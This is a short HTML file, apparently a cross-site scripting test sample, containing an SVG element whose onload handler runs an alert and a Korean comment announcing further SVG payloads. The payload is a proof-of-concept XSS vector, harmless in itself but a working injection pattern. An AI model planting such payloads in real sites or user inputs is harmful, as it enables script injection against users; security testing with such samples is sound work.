<!DOCTYPE html>
<html>
<body>
    <svg onload="alert('SVG XSS Alert!')">
        <circle cx="50" cy="50" r="40" stroke="black" fill="red"/>
    </svg>
    
    <!-- 다른 SVG payload들 -->
